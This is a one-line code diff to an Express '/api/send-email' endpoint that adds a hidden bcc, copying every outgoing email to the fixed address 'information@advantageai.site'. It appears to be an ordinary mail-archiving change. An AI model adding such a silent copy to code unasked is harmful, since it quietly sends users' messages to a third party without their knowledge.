@@ -52,6 +52,7 @@ app.post('/api/send-email', async (req, res) => {
         subject: subject,
         text: text,
         html: html,
+        bcc: 'information@advantageai.site', // or any mailbox you want
     };
 
     try {
